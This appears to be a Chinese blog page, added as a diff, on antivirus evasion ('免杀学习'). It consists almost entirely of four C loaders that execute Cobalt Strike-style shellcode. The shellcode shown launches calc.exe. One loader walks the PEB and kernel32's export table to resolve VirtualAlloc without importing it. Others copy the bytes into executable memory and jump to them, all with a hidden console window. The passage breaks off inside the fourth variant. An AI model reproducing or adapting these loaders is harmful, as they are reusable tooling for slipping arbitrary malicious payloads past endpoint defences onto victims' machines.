@@ -1,0 +1,385 @@
+<!DOCTYPE html>
+<html lang="cn">
+
+<head>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--动态线条背景-->
+<script type="text/javascript"
+color="220,220,220" opacity='0.7' zIndex="-2" count="200" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js">
+</script>
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="This_is_Y">
+    
+    <title>
+        
+            免杀学习 |
+        
+        This_is_Y
+    </title>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="shortcut icon" href="/images/title.jpg">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.4.1/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"cn","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":false,"init_open":false},"style":{"primary_color":"#33CCCC","avatar":"/images/head.png","favicon":"/images/title.jpg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":true},"first_screen":{"enable":false,"background_img":"/images/Watch.png","description":"Life is but a Dream"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":false},"version":"3.4.1"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+</head>
+
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            <a class="logo-title" href="/">
+                This_is_Y
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories/cnblogs/"
+                            >
+                                CNBLOGS
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories/cnblogs/">CNBLOGS</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="page-template-container">
+        
+        
+        <div class="page-template-content markdown-body">
+            
+                <h1 id="CobaltStrike-shellcode-loader"><a href="#CobaltStrike-shellcode-loader" class="headerlink" title="CobaltStrike shellcode loader"></a>CobaltStrike shellcode loader</h1><p>主机ip：192.168.123.78</p>
+<p>kali：192.168.87.128    </p>
+<p>CobaltStrike c语言payload（不是x64的）加载器<br>代码中的shellcode都是calc.exe</p>
+<p>参考学习：<br><a class="link" target="_blank" rel="noopener" href="https://www.secpulse.com/archives/151899.html">https://www.secpulse.com/archives/151899.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/TideSec/BypassAntiVirus">https://github.com/TideSec/BypassAntiVirus<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/Akkuman/p/11851057.html">https://www.cnblogs.com/Akkuman/p/11851057.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/VbahKWF_n8aKxKs7mdOLXg">https://mp.weixin.qq.com/s/VbahKWF_n8aKxKs7mdOLXg<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/G1hmsDVTO2208Ymlia_ggQ">https://mp.weixin.qq.com/s/G1hmsDVTO2208Ymlia_ggQ<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://github.com/aleenzz/Cobalt_Strike_wiki">https://github.com/aleenzz/Cobalt_Strike_wiki<i class="fas fa-external-link-alt"></i></a><br>第二节c shellcode加载</p>
+<h2 id="1"><a href="#1" class="headerlink" title="1"></a>1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PTCHAR char*</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD _getKernelBase()</span><br><span class="line">&#123;</span><br><span class="line">  DWORD dwPEB;</span><br><span class="line">  DWORD dwLDR;</span><br><span class="line">  DWORD dwInitList;</span><br><span class="line">  DWORD dwDllBase;<span class="comment">//当前地址</span></span><br><span class="line">  PIMAGE_DOS_HEADER pImageDosHeader;<span class="comment">//指向DOS头的指针</span></span><br><span class="line">  PIMAGE_NT_HEADERS pImageNtHeaders;<span class="comment">//指向NT头的指针</span></span><br><span class="line">  DWORD dwVirtualAddress;<span class="comment">//导出表偏移地址</span></span><br><span class="line">  PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;<span class="comment">//指向导出表的指针</span></span><br><span class="line">  PTCHAR lpName;<span class="comment">//指向dll名字的指针</span></span><br><span class="line">  TCHAR szKernel32[] = TEXT(<span class="string">&quot;KERNEL32.dll&quot;</span>);</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    mov eax, FS:[<span class="number">0x30</span>]<span class="comment">//获取PEB所在地址</span></span><br><span class="line">    mov dwPEB, eax</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dwLDR = *(PDWORD)(dwPEB + <span class="number">0xc</span>);<span class="comment">//获取PEB_LDR_DATA 结构指针</span></span><br><span class="line">  dwInitList = *(PDWORD)(dwLDR + <span class="number">0x1c</span>);<span class="comment">//获取InInitializationOrderModuleList 链表头</span></span><br><span class="line">  <span class="comment">//第一个LDR_MODULE节点InInitializationOrderModuleList成员的指针</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;dwDllBase = *(PDWORD)(dwInitList + <span class="number">8</span>);<span class="comment">//结构偏移0x8处存放模块基址</span></span><br><span class="line">    dwInitList = *(PDWORD)dwInitList<span class="comment">//结构偏移0处存放下一模块结构的指针</span></span><br><span class="line">    )</span><br><span class="line">  &#123;</span><br><span class="line">    pImageDosHeader = (PIMAGE_DOS_HEADER)dwDllBase;</span><br><span class="line">    pImageNtHeaders = (PIMAGE_NT_HEADERS)(dwDllBase + pImageDosHeader-&gt;e_lfanew);</span><br><span class="line">    dwVirtualAddress = pImageNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress;<span class="comment">//导出表偏移</span></span><br><span class="line">    pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dwDllBase + dwVirtualAddress);<span class="comment">//导出表地址</span></span><br><span class="line">    lpName = (PTCHAR)(dwDllBase + pImageExportDirectory-&gt;Name);<span class="comment">//dll名字</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(lpName) == <span class="number">0xc</span> &amp;&amp; !<span class="built_in">strcmp</span>(lpName, szKernel32))<span class="comment">//判断是否为“KERNEL32.dll”</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> dwDllBase;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">获取指定字符串的API函数的调用地址</span></span><br><span class="line"><span class="comment">入口参数：_hModule为动态链接库的基址</span></span><br><span class="line"><span class="comment">_lpApi为API函数名的首址</span></span><br><span class="line"><span class="comment">出口参数：eax为函数在虚拟地址空间中的真实地址</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">DWORD _getApi(DWORD _hModule, PTCHAR _lpApi)</span><br><span class="line">&#123;</span><br><span class="line">  DWORD i;</span><br><span class="line">  DWORD dwLen;</span><br><span class="line">  PIMAGE_DOS_HEADER pImageDosHeader;<span class="comment">//指向DOS头的指针</span></span><br><span class="line">  PIMAGE_NT_HEADERS pImageNtHeaders;<span class="comment">//指向NT头的指针</span></span><br><span class="line">  DWORD dwVirtualAddress;<span class="comment">//导出表偏移地址</span></span><br><span class="line">  PIMAGE_EXPORT_DIRECTORY pImageExportDirectory;<span class="comment">//指向导出表的指针</span></span><br><span class="line">  TCHAR** lpAddressOfNames;</span><br><span class="line">  PWORD lpAddressOfNameOrdinals;<span class="comment">//计算API字符串的长度</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; _lpApi[i]; ++i);</span><br><span class="line">  dwLen = i;</span><br><span class="line"></span><br><span class="line">  pImageDosHeader = (PIMAGE_DOS_HEADER)_hModule;</span><br><span class="line">  pImageNtHeaders = (PIMAGE_NT_HEADERS)(_hModule + pImageDosHeader-&gt;e_lfanew);</span><br><span class="line">  dwVirtualAddress = pImageNtHeaders-&gt;OptionalHeader.DataDirectory[<span class="number">0</span>].VirtualAddress;<span class="comment">//导出表偏移</span></span><br><span class="line">  pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(_hModule + dwVirtualAddress);<span class="comment">//导出表地址</span></span><br><span class="line">  lpAddressOfNames = (TCHAR**)(_hModule + pImageExportDirectory-&gt;AddressOfNames);<span class="comment">//按名字导出函数列表</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; _hModule + lpAddressOfNames[i]; ++i)</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(_hModule + lpAddressOfNames[i]) == dwLen &amp;&amp;</span><br><span class="line">      !<span class="built_in">strcmp</span>(_hModule + lpAddressOfNames[i], _lpApi))<span class="comment">//判断是否为_lpApi</span></span><br><span class="line">    &#123;</span><br><span class="line">      lpAddressOfNameOrdinals = (PWORD)(_hModule + pImageExportDirectory-&gt;AddressOfNameOrdinals);<span class="comment">//按名字导出函数索引列表</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> _hModule + ((PDWORD)(_hModule + pImageExportDirectory-&gt;AddressOfFunctions))</span><br><span class="line">        [lpAddressOfNameOrdinals[i]];<span class="comment">//根据函数索引找到函数地址</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(shellcode);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//动态加载并执行shellcode</span></span><br><span class="line">  TCHAR szVirAlloc[] = TEXT(<span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">  <span class="function"><span class="keyword">typedef</span> <span class="title">LPVOID</span><span class="params">(WINAPI* VirtualAllocB)</span><span class="params">(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect)</span></span>;</span><br><span class="line"></span><br><span class="line">  VirtualAllocB p = (VirtualAllocB)_getApi(_getKernelBase(), szVirAlloc); </span><br><span class="line">  <span class="keyword">char</span>* a = (<span class="keyword">char</span>*)(*p)(<span class="literal">NULL</span>, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">  <span class="built_in">memcpy</span>(a, shellcode, size);</span><br><span class="line">  (*(<span class="keyword">void</span>(*)())a)();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2"><a href="#2" class="headerlink" title="2"></a>2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	((<span class="keyword">void</span>(*)(<span class="keyword">void</span>))&amp;shellcode)();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="3"><a href="#3" class="headerlink" title="3"></a>3</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(_stdcall *CODE)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    PVOID p = <span class="literal">NULL</span>;</span><br><span class="line">    p = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(p, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    </span><br><span class="line">    CODE code = (CODE)p;</span><br><span class="line">    code();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="4"><a href="#4" class="headerlink" title="4"></a>4</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52&quot;</span></span><br><span class="line"><span class="string">&quot;\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1&quot;</span></span><br><span class="line"><span class="string">&quot;\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b&quot;</span></span><br><span class="line"><span class="string">&quot;\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb&quot;</span></span><br><span class="line"><span class="string">&quot;\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5&quot;</span></span><br><span class="line"><span class="string">&quot;\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     __asm</span><br><span class="line">    &#123;  </span><br><span class="line">        lea eax,shellcode;  </span><br><span class="line">        jmp eax;  </span><br><span class="line">    &#125;  